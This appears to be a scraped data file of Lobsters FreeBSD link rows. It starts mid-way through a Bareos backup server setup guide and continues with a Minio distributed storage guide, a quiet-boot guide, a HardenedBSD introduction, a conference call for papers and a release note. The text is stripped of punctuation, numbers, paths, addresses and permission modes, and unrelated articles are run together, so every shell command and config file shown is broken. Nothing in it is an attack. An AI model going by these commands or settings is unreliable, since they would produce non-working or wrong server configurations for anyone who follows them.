root replica vi usrlocaletcphpini add timezone location europewarsaw location root replica diff u phpiniproduction phpini phpiniproduction phpini defines default timezone used date function http phpnetdatetimezone datetimezone datetimezone europewarsaw http phpnetdatedefaultlatitude datedefaultlatitude php phpfpm daemon configuration root replica cat usrlocaletcphpfpmconf global pid runphpfpmpid loglevel notice www user www group www listen listenbacklog listenowner www listengroup www listenmode listenallowedclients pm static pmmaxchildren pmstartservers pmminspareservers pmmaxspareservers pmprocessidletimeout pmmaxrequests requestterminatetimeout rlimitfiles env hostname hostname env path usrlocalbin usrbin bin env tmp tmp env tmpdir tmp env temp tmp rest bareos webui configuration new usrlocaletcbareosbareosdirdconsoleadminconf file root replica cat usrlocaletcbareosbareosdirdconsoleadminconf console name admin password adminpassword profile webuiadmin new usrlocaletcbareosbareosdirdprofilewebuiadminconf file root replica cat usrlocaletcbareosbareosdirdprofilewebuiadminconf profile name webuiadmin commandacl bvfsclearcache exit sql configure create delete purge sqlquery umount unmount job acl schedule acl catalog acl pool acl storage acl client acl fileset acl acl plugin option acl may add director well modified usrlocaletcbareoswebuidirectorsini file root replica cat usrlocaletcbareoswebuidirectorsini section localhostdir replicabackuporg enabled yes diraddress replicabackuporg dirport catalog mycatalog modified usrlocaletcbareoswebuiconfigurationini file root replica cat usrlocaletcbareoswebuiconfigurationini session setting session dashboard setting dashboard table setting table savepreviousstatefalse various setting autochanger labelpooltypescratch last least need set permission bareos webui configuration file root replica chown r www www usrlocaletcbareoswebui root replica chown r www www usrlocalwwwbareoswebui log let create needed log file fix permission root replica chown r bareos bareos varlogbareos root replica varlogphpfpmlog root replica chown r www www varlogphpfpmlog root replica chown r www www varlognginx add rule newsyslog log rotate daemon want filesystem fill newsyslog cover confd directory use instead modifying main etcnewsyslogconf configuration file root replica grep confd etcnewsyslogconf etcnewsyslogconfd usrlocaletcnewsyslogconfd root replica mkdir p usrlocaletcnewsyslogconfd root replica cat usrlocaletcnewsyslogconfdbareos eof bareos varlogphpfpmlog www www j varlognginxaccesslog www www j varlognginxerrorlog www www j varlogbareosbareoslog bareos bareos j varlogbareosbareosauditlog bareos bareos j eof let verify newsyslog understands configuration root replica newsyslog v tail varlogphpfpmlog trim tue may varlognginxaccesslog trim tue may varlognginxerrorlog trim tue may varlogbareosbareoslog trim tue may varlogbareosbareosauditlog trim tue may skel need create called bareos skel file rc script gather configuration one file bareos service would stop see error like one root replica usrlocaletcrcdbareossd onestart starting bareossd bareossd jobid error failed read config file usrlocaletcbareosbareossdconf bareossd error termination failed find config filename usrlocaletcrcdbareossd warning failed start bareossd let create root replica cat usrlocaletcbareosbareosdirconf eof usrlocaletcbareosbareosdird eof root replica cat usrlocaletcbareosbareosfdconf eof usrlocaletcbareosbareosfdd eof root replica cat usrlocaletcbareosbareossdconf eof usrlocaletcbareosbareossdd eof root replica cat usrlocaletcbareosbconsoleconf eof usrlocaletcbareosbconsoled eof verify content root replica cat usrlocaletcbareosbareosdirconf usrlocaletcbareosbareosdird root replica cat usrlocaletcbareosbareosfdconf usrlocaletcbareosbareosfdd root replica cat usrlocaletcbareosbareossdconf usrlocaletcbareosbareossdd root replica cat usrlocaletcbareosbconsoleconf usrlocaletcbareosbconsoled modification added file lefs make sure usrlocaletcbareos dir permission properly set root replica chown r bareos bareos usrlocaletcbareos root replica find usrlocaletcbareos type f exec chmod root replica find usrlocaletcbareos type exec chmod alive back system setting add service start main freebsd etcrcconf file modification final etcrcconf file look follows root replica cat etcrcconf network hostnamereplicabackuporg inet defaultrouter daemon zfsenableyes sshdenableyes nfsclientenableyes syslogdflags s sendmailenablenone cleartmpenableyes dumpdevno bareos postgresqlenableyes postgresqlclasspgsql bareosdirenableyes bareossdenableyes bareosfdenableyes phpfpmenableyes nginxenableyes postgresql server already running root replica usrlocaletcrcdpostgresql status pgctl server running pid usrlocalbinpostgres usrlocalpgsqldata start rest bareos stack service first php phpfpm daemon root replica usrlocaletcrcdphpfpm start performing sanity check phpfpm configuration notice configuration file usrlocaletcphpfpmconf test successful starting phpfpm nginx webserver root replica usrlocaletcrcdnginx start performing sanity check nginx configuration nginx configuration file usrlocaletcnginxnginxconf syntax ok nginx configuration file usrlocaletcnginxnginxconf test successful starting nginx bareos storage daemon root replica usrlocaletcrcdbareossd start starting bareossd bareos file daemon also known bareos client root replica usrlocaletcrcdbareosfd start starting bareosfd last least important daemon guide bareos director root replica usrlocaletcrcdbareosdir start starting bareosdir may see port daemon listening root replica sockstat user command pid fd proto local address foreign address bareos bareosdir root bareosfd www nginx www nginx www nginx www nginx root nginx www phpfpm www phpfpm www phpfpm www phpfpm root phpfpm bareos bareossd pgsql postgres root sshd case wandered order service start answer rc subsystem root replica rcorder etcrcd usrlocaletcrcd grep e bareosphpfpmnginxpostgresql usrlocaletcrcdpostgresql usrlocaletcrcdphpfpm usrlocaletcrcdnginx usrlocaletcrcdbareossd usrlocaletcrcdbareosfd usrlocaletcrcdbareosdir access http browser indeed alive login admin user adminpassword password logged see empty bareos dashboard job make life easier prepared two script adding client bareos server bronzejobsh bronzeschedsh generate bareos file new job schedule put rootbin dir convenience root replica mkdir rootbin script available downloading please rename accordingly wordpress limitation root replica mv bronzeschedshkey bronzeschedsh root replica mv bronzejobshkey bronzejobsh let make executable root replica chmod x rootbinbronzeschedsh root replica chmod x rootbinbronzejobsh help message root replica rootbinbronzeschedsh usage bronzeschedsh group time example bronzeschedsh root replica rootbinbronzejobsh usage bronzejobsh group time client type group option time option client option fqdn type option unix window example bronzejobsh clientdomaincom unix client first client use replicabackuporg client server first use bronzeschedsh create new scheduler configuration script echo name file created root replica rootbinbronzeschedsh use window backup client schedule remove root replica rm f use bronzejobsh add client type created earlier schedule name created file also echoed stdout root replica rootbinbronzejobsh replicabackuporg unix info client dns check info dns record host replicabackuporg found nxdomain info dns ptr record host nxdomain found nxdomain need reload bareos server configuration root replica echo reload bconsole connecting director ok replicabackuporg version october enter period cancel command reload reloaded let see look browser run job cancel rerun client replicabackuporg configured let go job tab start backup job message backup job started see running state job tab dashboard also display message clicking number job tab cancelling first job starting till completion dashboard activity restore let restore data bareos breeze accessed directly browser restore tab restore job started dashboard restoration volume precious data content volume status bareos director director message equivalent query actlog ibm tsm call recently ibm spectrum protect bareos console bconsole directly browser masterpiece confirmation restored file root replica l l tmpbareosrestorescopyright r r r root wheel jul tmpbareosrestorescopyright root replica tmpbareosrestorescopyright copyright column tmpbareosrestorescopyright copyright remote replica volume backup bareos directory configure rsync replicate backup bareosdr directory nfs server location root replica pkg install rsync rsync command look like usrlocalbinrsync r u l p force nowholefile numericids deleteafter bareos bareosdr put command crontab root job root replica crontab e root replica crontab l usrlocalbinrsync r u l p force nowholefile numericids deleteafter bareos bareosdr backup finished end backup window start replication summary configured ready make backup restore bareos backup server freebsd operating system used appliance virtualization platform also physical server local storage resource without nfs share update die hard tribute loader freebsd developer even made tribute die hard movie actually implemented nakatomi socrates screen freebsd loader shown image unfortunately removed later freebsd official freebsd version update bareos backup server freebsd article featured bsd bare o episode thanks mentioning update additional permission thanks math user identified problem added paragraph proper place make howto complete without many bareos daemon would start permission error added paragraph also need change permission varrun vardb directory bareos root replica chown r bareos bareos vardbbareos root replica chown r bareos bareos varrunbareos eof like like loading related
390,Lobsters,freebsd,FreeBSD,Writing FreeBSD Malware,https://www.youtube.com/watch?v=bT_k06Xg-BE,writing freebsd malware,press copyright contact u creator advertise developer term privacy policy safety youtube work test new feature writing freebsd malware shawn webb youtube,press copyright contact u creator advertise developer term privacy policy safety youtube work test new feature writing freebsd malware shawn webb youtube
391,Lobsters,freebsd,FreeBSD,Call for Papers | EuroBSDcon 2018,https://2018.eurobsdcon.org/call-for-papers/,call paper eurobsdcon,call paper call talk presentation proposal cfp call tutorial proposal submission http registrationeurobsdconorg,call paper call talk presentation proposal cfp eurobsdcon program committee inviting bsd developer user submit innovative original talk proposal previously presented european conference topic interest conference include limited application architecture implementation performance security bsdbased operating system well topic concerning economic organizational aspect bsd use presentation expected minute delivered english call tutorial proposal eurobsdcon program committee also inviting qualified practitioner field submit proposal half full day tutorial topic relevant development implementation use bsdbased system halfday tutorial expected hour fullday tutorial hour tutorial talk held english submission proposal sent registration system http registrationeurobsdconorg contain short concise text description word submission also include short cv speaker estimate expected travel expense submission period begun tuesday april close sunday â june
392,Lobsters,freebsd,FreeBSD,nuster 1.7.10.1 released – A caching proxy server based on HAProxy,https://github.com/jiangwenyuan/nuster/releases/tag/v1.7.10.1,nuster released caching proxy server based haproxy,added changed reload reload,update haproxy change config directive remove share onoff mode refactor code next haproxy merging added upgrade haproxy proxy mode changed refactoring separate include nuster directory split header separate src nuster directory split source append nusternst function variable update config keyword global cache nuster cache proxy filter cache nuster cache proxy cacherule nuster rule remove share onoff keyword perform action time signed another tab window reload refresh session signed another tab window reload refresh session
394,Lobsters,freebsd,FreeBSD,FreeBSD Desktop – Part 1 – Simplified Boot,https://vermaden.wordpress.com/2018/03/29/freebsd-desktop-part-1-simplified-boot/,freebsd desktop part simplified boot,freebsd desktop global page guru meditaion oracle killed solarissparczfs team http comparing pf oracle solaris ip filter openbsd packet filter http http freebsdorg login grep bootmute bootloaderconf grep n e devnull etcrcd grep e routingnetifldconfig etcrcdrandom grep n randomstart etcrcdrandom diff rq etcrcd column diff u rcdldconfig etcrcdldconfig diff u rcdnetif etcrcdnetif diff u rcdnfsclient etcrcdnfsclient diff u rcdrandom etcrcdrandom diff u rcdrouting etcrcdrouting x update freebsd diff u homevermadenrcdevmatch devmatch update silencing diff u rootsyslogconf etcsyslogconf update silence service starting message vmisev rcstartmsgsno etcrcconf rcstartmsgsno etcrcconf like,first post freebsd desktop series may want check article freebsd desktop series freebsd desktop global page find link episode series along table content episode content default freebsd boot process quite verbose lot debugging information along kernel message may divide boot process several screen stage first thing see bios screen computer manufacturer second thing freebsd btx loader third one freebsd boot menu eventual zfs boot environment use zfs root filesystem option select like single user mode example one system boot along kernel message nonnative resolution middle stage screen switch native resolution continues display kernel message service leading text prompt login end come optional fifth screen may graphically started login manager like slim gdm verbose information usually useful server much laptop andor desktopworkstation system unix philosophy say anything stdout everything ok stdoutstderr used something wrong like amiga anything wrong want see big red sign like guru meditaion everything ok shut slience golden really like sun solaris approach boot minimal information like version hostname login prompt le line image first sun solaris boot includes additional openssh server key generation information unfortunately despite oracle say oracle solaris dying gathered information oracle killed solarissparczfs team http freebsd forum recent oracle solaris release process along public beta change oracle solaris kept maintenance mode rest life set oracle currently pity even bsd bit recently found way solaris example openbsd pf firewall difference comparing pf oracle solaris ip filter openbsd packet filter http difference openbsd pf freebsd pf back freebsd according project website http freebsdorg freebsd operating system used power modern server desktop embedded platform tune boot process appealing laptopsdesktops stage default freebsd boot process login prompt lean standard one parameter bootloaderconf slightly silenced startup script whole lot better modification needed first add bootmuteyes option bootloaderconf file may well add parameter bootloaderconf file speed boot process second default delay second grep bootmute bootloaderconf bootmuteyes next need modify startup script etcrcdldconfig etcrcdnetif etcrcdnfsclient etcrcdrandom etcrcdrouting summary change case adding devnull devnull devnull display unneeded information boot process grep n e devnull etcrcd grep e routingnetifldconfig checkstartmsgs echo elf ldconfig path ldc devnull echo compatibility ldconfig path ldc devnull sbinifconfig ifn devnull devnull eval static delete devnull devnull static add devnull devnull static add add devnull devnull exception etcrcdrandom requires little love grep n randomstart etcrcdrandom randomstart harvestmask gt echo n setting harvesting sysctl kernrandomharvestmask harvestmask devnull sysctln kernrandomharvestmasksymbolic fi diff patch way easier diff rq etcrcd column file etcrcdldconfig differ file etcrcdnetif differ file etcrcdnfsclient differ file etcrcdrandom differ file etcrcdrouting differ diff u rcdldconfig etcrcdldconfig rcdldconfig etcrcdldconfig ldc ldc fi done checkstartmsgs echo elf ldconfig path ldc checkstartmsgs echo elf ldconfig path ldc devnull ldconfig elf in ldc case sysctl n hwmachinearch fi done checkstartmsgs echo compatibility ldconfig path ldc echo compatibility ldconfig path ldc devnull ldconfig in ldc esac diff u rcdnetif etcrcdnetif rcdnetif etcrcdnetif esac checkstartmsgs ifn ok sbinifconfig ifn sbinifconfig ifn devnull devnull done fi fi diff u rcdnfsclient etcrcdnfsclient rcdnfsclient etcrcdnfsclient successfully notified previous client shutdown vardbmounttab nothing f vardbmounttab rpcumntall k rpcumntall k devnull fi loadrcconfig name diff u rcdrandom etcrcdrandom rcdrandom etcrcdrandom randomstart harvestmask gt echo n setting harvesting sysctl kernrandomharvestmask harvestmask devnull sysctln kernrandomharvestmasksymbolic fi harvestmask gt echo n setting harvesting sysctl kernrandomharvestmask harvestmask devnull sysctln kernrandomharvestmasksymbolic fi echo n feeding entropy echo n feeding entropy w devrandom warn devrandom writeable diff u rcdrouting etcrcdrouting rcdrouting etcrcdrouting aa aa nn yy inet atm afexists continue eval static delete eval static delete devnull devnull specified flush route n eval routingstop case static static add static add devnull devnull ret option option doall static add static add add devnull devnull ret option let see freebsd boot modification definitely perfect lot better taste let login desktop prefer use login manager alias named x xinit command way login type x press enter desktop started x x aliased xinit xinitrc dpi nolisten tcp devnull devnull update freebsd recently tried freebsd version one talkative script also could silenced little etcrcddevmatch scrtipt needed patch make great nice clean diff u homevermadenrcdevmatch devmatch homevermadenrcdevmatch devmatch case x continue esac echo autoloading module echo autoloading module kldload n done devctl thaw update drmkmod silencing recently get support newer gpus drmkmod meta portpackage needed thing add intel gpus kldlist parameter display following error message kernel even bootmuteyes bootloaderconf file loading kernel module dec kernel failed add wc mtrr performance may suffer syslogd guilty default configuration etcsyslogconf file make silent print pointless message make change etcsyslogconf file diff u rootsyslogconf etcsyslogconf rootsyslogconf etcsyslogconf separator sharing file system may want use tab field separator consult syslogconf manpage err kernwarning authnotice mailcrit devconsole err kernwarning authnotice mailcrit devconsole notice authprivnone kerndebug lprinfo mailcrit newserr varlogmessages security varlogsecurity authinfo authprivinfo varlogauthlog print pointless message applies version update silence service starting message thanks vmisev suggestion silence freebsd boot process even add rcstartmsgsno etcrcconf file reboot see effect already silenced boot process earlier setting adding rcstartmsgsno etcrcconf file boot message cut half close solarisillumos provides eof like like loading related
395,Lobsters,freebsd,FreeBSD,Distributed Object Storage with Minio on FreeBSD,https://vermaden.wordpress.com/2018/04/16/distributed-object-storage-with-minio-on-freebsd/,distributed object storage minio freebsd,zfs cloud object storage setup jail host command storagex command mkdir p jailbase cd jailbase fetch http echo tar unlink xpjf jailbasebasetxz c jailstorage done cat etcjailconf eof storage hosthostname storage local interface path jailstorage execstart binsh etcrc execstop binsh etcrcshutdown execclean mountdevfs allowrawsockets eof done cat etcjailconf service jail onestart storage done jls echo nameserver jailstorage etcresolvconf done jexec storage env assumealwaysyesyes pkg install minio echo done jexec storage minio done cat etchosts eof eof cat etchosts eof eof cat etchosts eof eof dir jexec storage mkdir p data dir done done dir jexec storage mkdir p data dir done done echo storage jexec storage l grep data echo done minio dir echo n http jls grep storage awk printf sed slocalg echo dir done done sort n dir echo n http jls grep storage awk printf sed slocalg echo dir done done sort n dir echo n http jls grep storage awk printf sed slocalg echo n dir done done sort n dir echo n http jls grep storage awk printf sed slocalg echo n dir done done sort n cat etcrcconf eof minioenableyes miniodisks http http http http http http http http http http http http http http http http eof cat etcrcconf jexec rm rf http rm rf usrlocaletcminio rm rf data data miniosys touch varlogminiolog chown minio minio varlogminiolog mkdir p usrlocaletcminio chown r minio minio usrlocaletcminio mkdir p http chown r minio minio http mkdir p http chown r minio minio http su minio c env minioaccesskeyalibaba minio server configdir usrlocaletcminio http http http http http http http http http http http http http http http http jexec rm rf http rm rf usrlocaletcminio rm rf data data miniosys touch varlogminiolog chown minio minio varlogminiolog mkdir p usrlocaletcminio chown r minio minio usrlocaletcminio mkdir p http chown r minio minio http mkdir p http chown r minio minio http su minio c env minioaccesskeyalibaba minio server configdir usrlocaletcminio http http http http http http http http http http http http http http http http jexec rm rf http rm rf usrlocaletcminio rm rf data data miniosys touch varlogminiolog chown minio minio varlogminiolog mkdir p usrlocaletcminio chown r minio minio usrlocaletcminio mkdir p http chown r minio minio http mkdir p http chown r minio minio http su minio c env minioaccesskeyalibaba minio server configdir usrlocaletcminio http http http http http http http http http http http http http http http http service minio start cat varlogminiolog service minio status p u minio create bucket test upload file file menu thinkpad design spirit essencepdf jexec find data test exit jexec find data test exit jexec find data test exit jexec cat usrlocaletcminioconfigjson test pkg install echo test chmod cat mkdir tmptest allowother usepathrequeststyle urlhttp test tmptest thinkpad design spirit essencepdf exa l tmptest file tmptestthinkpad design spirit essencepdf stat tmptestthinkpad design spirit essencepdf cp v homevermadenon shortness life lucius senecapdf tmptest file tmpteston shortness life lucius senecapdf real hardware supermicro object storage solution data archive using supermicro openio sd supermicro supermicro o compatibility http x sandisk cruzer fit usb x sata hitachi x micron max sata ssd x micron eco series sata ssd x sfp port minio algorithm data redundancy pb usable storage space object storage freebsd appliance update distributed object storage minio freebsd bsd disclosure like,meet minio free open source distributed object storage server compatible amazon api offer data protection hardware failure using erasure code bitrot detection support highly available distributed setup provides confidentiality integrity authenticity assurance encrypted data negligible performance overhead server side client side encryption supported image example minio setup minio identifies zfs cloud object storage guide show setup highly available distributed minio storage freebsd operating system zfs backend minio data convenience use freebsd jail operating system level virtualization setup setup assume datacenters assumption two datacenters whose data must reside third datacenter used quorumwitness role distributed minio support nodesdrives total may juggle number balance data desired datacenters drive allocate resource site use approach datacenters data must reside ratio quorumwitness datacenter ratio thanks built minio redundancy may loose turn example one machine object storage still available ready use purpose jail first create jail proof concept minio setup quorumwitness role data role distinguish command type host system storagex jail use two different prompt way obvious command execute command host system host command command storagex jail root storagex command first create base jail setup host mkdir p jailbase host cd jailbase host fetch http host echo tar unlink xpjf jailbasebasetxz c jailstorage done host add jail configuration etcjailconf file used laptop jail host jail configured use wireless interface address host cat etcjailconf eof storage hosthostname storage local interface path jailstorage execstart binsh etcrc execstop binsh etcrcshutdown execclean mountdevfs allowrawsockets eof done host let verify etcjailconf file configured desired host cat etcjailconf hosthostname interface path execstart binsh etcrc execstop binsh etcrcshutdown execclean mountdevfs allowrawsockets hosthostname interface path execstart binsh etcrc execstop binsh etcrcshutdown execclean mountdevfs allowrawsockets hosthostname interface path execstart binsh etcrc execstop binsh etcrcshutdown execclean mountdevfs allowrawsockets host start jail host service jail onestart storage done starting jail starting jail starting jail let see work host jls jid ip address hostname path let add dns server internet connectivity host echo nameserver jailstorage etcresolvconf done install minio package host jexec storage env assumealwaysyesyes pkg install minio echo done bootstrapping pkg pkghttp please wait verifying signature trusted certificate done installing extracting updating freebsd repository catalogue pkg repository freebsd load error access repo file vardbpkgrepofreebsdsqlite failed file directory fetching metatxz b fetching packagesitetxz mib processing entry freebsd repository update completed package processed repository date updating database digest format following package affected checked new package installed minio number package installed process require mib space mib downloaded fetching mib checking integrity done conflicting installing creating group creating group minio gid creating user creating user minio uid extracting bootstrapping pkg pkghttp please wait verifying signature trusted certificate done installing extracting updating freebsd repository catalogue pkg repository freebsd load error access repo file vardbpkgrepofreebsdsqlite failed file directory fetching metatxz b fetching packagesitetxz mib processing entry freebsd repository update completed package processed repository date updating database digest format following package affected checked new package installed minio number package installed process require mib space mib downloaded fetching mib checking integrity done conflicting installing creating group creating group minio gid creating user creating user minio uid extracting bootstrapping pkg pkghttp please wait verifying signature trusted certificate done installing extracting updating freebsd repository catalogue pkg repository freebsd load error access repo file vardbpkgrepofreebsdsqlite failed file directory fetching metatxz b fetching packagesitetxz mib processing entry freebsd repository update completed package processed repository date updating database digest format following package affected checked new package installed minio number package installed process require mib space mib downloaded fetching mib checking integrity done conflicting installing creating group creating group minio gid creating user creating user minio uid extracting host let verify minio package installed successfully host jexec storage minio done usrlocalbinminio usrlocalbinminio usrlocalbinminio host configure etchosts file root cat etchosts eof eof root cat etchosts eof eof root cat etchosts eof eof create directory minio data host dir jexec storage mkdir p data dir done done host dir jexec storage mkdir p data dir done done let verify data directory created successfully host echo storage jexec storage l grep data echo done basic minio command example root minio name minio cloud storage server description minio amazon compatible object storage server use store photo video vms container log file blob data object usage minio flag command args command server start object storage server gateway start object storage gateway update check new software update version print version flag configdir value c value path configuration directory default rootminio quiet disable startup information json output server log startup information json format help h show help version generate list directory server add argument minio host dir echo n http jls grep storage awk printf sed slocalg echo dir done done sort n host dir echo n http jls grep storage awk printf sed slocalg echo dir done done sort n http http http http http http http http http http http http http http http http well write hand course host dir echo n http jls grep storage awk printf sed slocalg echo n dir done done sort n host dir echo n http jls grep storage awk printf sed slocalg echo n dir done done sort n list data directory use configure minio freebsd main configuration etcrcconf file http http http http http http http http http http http http http http http http let put minio setting etcrcconf file root storagex cat etcrcconf eof minioenableyes miniodisks http http http http http http http http http http http http http http http http eof root storagex root storagex cat etcrcconf minioenableyes miniodisks http http http http http http http http http http http http http http http http root storagex start configure minio first time storagex server run following set command host jexec root root rm rf http root rm rf usrlocaletcminio root rm rf data data miniosys root touch varlogminiolog root chown minio minio varlogminiolog root mkdir p usrlocaletcminio root chown r minio minio usrlocaletcminio root mkdir p http root chown r minio minio http root mkdir p http root chown r minio minio http root su minio c env minioaccesskeyalibaba minio server configdir usrlocaletcminio http http http http http http http http http http http http http http http http created minio configuration file successfully usrlocaletcminio waiting first server format disk waiting first server format disk drive capacity gib free gib total status online offline endpoint http accesskey alibaba secretkey browser access http commandline access http docsminioiodocsminioclientquickstartguide mc config host add myminio http alibaba object api amazon compatible go http docsminioiodocsgolangclientquickstartguide java http docsminioiodocsjavaclientquickstartguide python http docsminioiodocspythonclientquickstartguide javascript http docsminioiodocsjavascriptclientquickstartguide net http docsminioiodocsdotnetclientquickstartguide host jexec root root rm rf http root rm rf usrlocaletcminio root rm rf data data miniosys root touch varlogminiolog root chown minio minio varlogminiolog root mkdir p usrlocaletcminio root chown r minio minio usrlocaletcminio root mkdir p http root chown r minio minio http root mkdir p http root chown r minio minio http root su minio c env minioaccesskeyalibaba minio server configdir usrlocaletcminio http http http http http http http http http http http http http http http http created minio configuration file successfully usrlocaletcminio waiting first server format disk waiting first server format disk drive capacity gib free gib total status online offline endpoint http accesskey alibaba secretkey browser access http commandline access http docsminioiodocsminioclientquickstartguide mc config host add myminio http alibaba object api amazon compatible go http docsminioiodocsgolangclientquickstartguide java http docsminioiodocsjavaclientquickstartguide python http docsminioiodocspythonclientquickstartguide javascript http docsminioiodocsjavascriptclientquickstartguide net http docsminioiodocsdotnetclientquickstartguide host jexec root root rm rf http root rm rf usrlocaletcminio root rm rf data data miniosys root touch varlogminiolog root chown minio minio varlogminiolog root mkdir p usrlocaletcminio root chown r minio minio usrlocaletcminio root mkdir p http root chown r minio minio http root mkdir p http root chown r minio minio http root su minio c env minioaccesskeyalibaba minio server configdir usrlocaletcminio http http http http http http http http http http http http http http http http created minio configuration file successfully usrlocaletcminio waiting first server format disk waiting first server format disk drive capacity gib free gib total status online offline endpoint http accesskey alibaba secretkey browser access http commandline access http docsminioiodocsminioclientquickstartguide mc config host add myminio http alibaba object api amazon compatible go http docsminioiodocsgolangclientquickstartguide java http docsminioiodocsjavaclientquickstartguide python http docsminioiodocspythonclientquickstartguide javascript http docsminioiodocsjavascriptclientquickstartguide net http docsminioiodocsdotnetclientquickstartguide look xterm terminal verify browser actually work hit ctrl c window stop minio cluster start minio freebsd rc subsystem service root service minio start starting minio root cat varlogminiolog root service minio status minio running pid let check work root p u minio pid tt stat time command isj daemon usrbinenv daemon ij usrlocalbinminio c usrlocaletcminio server basic operation login minio distributed storage create new bucket upload file empty minio cluster look like select create bucket option button use name test new bucket created access let upload file using menu previously upload progress shown minio file indeed uploaded clicking may access directly browser also share link file using file menu shown link creation dialog shown let see minio distributes data thinkpad design spirit essencepdf file case data directory spread across server host jexec root find data test design spirit essencepdf design spirit essencepdfxljson design spirit design spirit essencepdf design spirit essencepdfxljson design spirit root exit host jexec root find data test design spirit essencepdf design spirit design spirit essencepdfxljson design spirit essencepdf design spirit essencepdfxljson design spirit design spirit essencepdf design spirit design spirit essencepdfxljson design spirit essencepdf design spirit design spirit essencepdfxljson design spirit essencepdf design spirit design spirit essencepdfxljson design spirit essencepdf design spirit design spirit essencepdfxljson design spirit essencepdf design spirit essencepdfxljson design spirit root exit host jexec root find data test design spirit essencepdf design spirit design spirit essencepdfxljson design spirit essencepdf design spirit essencepdfxljson design spirit design spirit essencepdf design spirit essencepdfxljson design spirit design spirit essencepdf design spirit design spirit essencepdfxljson design spirit essencepdf design spirit design spirit essencepdfxljson design spirit essencepdf design spirit design spirit essencepdfxljson design spirit essencepdf design spirit essencepdfxljson design spirit root exit also see minio configuration file usrlocaletcminioconfigjson generated host jexec root cat usrlocaletcminioconfigjson version credential accesskey alibaba secretkey region browser domain storageclass standard rrs notify amqp enable false url exchange routingkey exchangetype deliverymode mandatory false immediate false durable false internal false nowait false autodeleted false elasticsearch enable false format url index kafka enable false broker null topic mqtt enable false broker topic qos clientid username password reconnectinterval keepaliveinterval mysql enable false format dsnstring table host port user password database nats enable false address subject username password token secure false pinginterval streaming enable false clusterid clientid async false maxpubacksinflight postgresql enable false format connectionstring table host port user password database redis enable false format address password key webhook enable false endpoint also mount test bucket distributed minio object storage cluster filesystem using project let add package mount bucket host pkg install configure password bucket host echo test host chmod host cat test let actual mount host mkdir tmptest host allowother usepathrequeststyle urlhttp test tmptest file thinkpad design spirit essencepdf put web interface host exa l tmptest root thinkpad design spirit essencepdf host file tmptestthinkpad design spirit essencepdf tmptestthinkpad design spirit essencepdf pdf document version host stat tmptestthinkpad design spirit essencepdf root wheel jan apr jan jan tmptestthinkpad design spirit essencepdf upload file bucket using mount host cp v homevermadenon shortness life lucius senecapdf tmptest homevermadenon shortness life lucius senecapdf tmpteston shortness life lucius senecapdf host file tmpteston shortness life lucius senecapdf shortness life lucius senecapdf pdf document version also verify file put visible web interface real hardware working proof concept distributed minio setup putting real hardware real storage purpose would setup node minio distributed server supermicro hardware supermicro even suggests using kind server object storage white paper topic object storage solution data archive using supermicro openio sd use openio minio distributed object storage solution server feature supermicro motherboard important motherboard officially support freebsd operating system supermicro o compatibility page motherboard specification feature x intel xeon tdp x udimm ecc rdimm x hotswap hdd bay x coldswap hdd bay x controller intel soc port x controller broadcom port x expansion slot pcie x expansion slot pcie x expansion slot minipcie w msata support x sfp port x lan port x external usb port x interlal usb port x highrfficiency redundant power supply configure get approximated price using thinkmate site http would add component basic setup x udimm full gb ecc rdimm x micron max sata ssd x micron eco series sata ssd x sata hitachi x sandisk cruzer fit usb use x sandisk cruzer fit usb disk install freebsd zfs rootboot pool mirror spare disk need performance x sata hitachi drive used raidz equivalent zfs without write hole minio data wich setup mean drive data drive parity lose half minio server would waste tb drive spare would use x micron max sata ssd mirror zfs zil zfs intent log accelerate writes x micron eco series sata ssd zfs read cache network would setup x sfp port lacp interface server would gbit connectivity give u total gbit theoretical network throughput setup would give tb zfs pool space tb read cache gb writes single server making calculation give tb pb space minio data minio algorithm data redundancy pb usable storage space object storage freebsd appliance bad taste update distributed object storage minio freebsd article included bsd disclosure episode thanks mentioning eof like like loading related
396,Lobsters,freebsd,FreeBSD,Introduction to HardenedBSD World,https://vermaden.wordpress.com/2018/04/06/introduction-to-hardenedbsd-world/,introduction hardenedbsd world,http hardenedbsdorgcontentabout http mfsbsdvxsk http wwwsolobsdorg http hardenedbsdorgcontenteasyfeaturecomparison install first login ssh notme localhost zfs boot environment pkg install beadm beadm list zfs list zfs rename u zrootusr zrootrootdefaultusr zfs rename u zrootvar zrootrootdefaultvar zfs list base system update freebsdupdate hbsdupdate v b updated h mf tf tf tf tf tf tf tf tf tf tf tf tf tf tf tf tf tf tf tf tf tf tf h df mf tf tf beadm list beadm mount updated beadm list cd make needed change reboot cd beadm umount updated shutdown r sysctl hardeningversion pkg install beadm beadm list zfs list beadm destroy default hbsdupdate v b new hardenedbsd port bareosclient fails build http groupsgooglecomahardenedbsdorgforum bug sysutilsbareosserver add gnutls option http bugsfreebsdorgbugzillashowbugcgi portsnap fetch extract pkg install gitlite git clone http githubcomhardenedbsdhardenedbsdportsgit usrports find usrports head git pull grep git varlogmessages cat bootloaderconf eof zfs vfszfsarcmin vfszfsarcmax eof shutdown r hardenedbsd base system source git clone singlebranch branch http githubcomhardenedbsdhardenedbsdstable usrsrc security administration pkg search secadm pkg install secadm secadmkmod cat usrlocaletcsecadmrules eof secadm integriforce path bindd hash type mode hard eof sysrc secadmenableyes usrlocaletcrcdsecadm start echo bindd tail varlogmessages bindd file l lh file resource http hardenedbsdorgshawnhbsdhandbookbookhtml hardenedbsdsecadm http groupsgooglecomahardenedbsdorgforum forumusers http githubcomhardenedbsdhardenedbsdwikinoncompliantapplications http githubcomhardenedbsdsecadmrules http twittercomhardenedbsd http twittercomsolobsd opnsense connection http wikiopnsenseorgrelationshardenedbsdhtml http update hardenedbsd switching back openssl update introduction hardenedbsd world bsd zfs user conf update http githubcomhardenedbsdhardenedbsdwiki like,hardenedbsd security enhanced fork freebsd happened hardenedbsd implementing many exploit mitigation security technology top freebsd started implementation address space layout randomization aslr fork created ease development cite http hardenedbsdorgcontentabout page hardenedbsd aim implement innovative exploit mitigation security solution freebsd community hardenedbsd take holistic approach security hardening system implementing exploit mitigation technology freebsd enthusiast know mfsbsd project martin matuska http mfsbsdvxsk freebsd system loaded completely memory mfsbsd synonym hardenedbsd world solobsd http wwwsolobsdorg based hardenedbsd source one may ask hardenedbsd project compared well know security openbsd system important question openbsd developer try write good code without dirty hack performance reason clean secure code important openbsd world openbsd project even made security audit openbsd code available line line easier achieve freebsd hardenedbsd openbsd code base ten time smaller also implication possibility freebsd hardenedbsd offer many new feature like mature smp subsystem even numa support zfs filesystem geom storage framework bhyve virtualization virtualbox option many new modern feature openbsd remains classic unix system ufs filesystem theoretical smp support vmm project tried implement new hypervisor openbsd world lack support graphic openbsd illumos linux currently virtualize window mac o x also virtualization option openbsd jail openbsd current bhyve implementation allows one 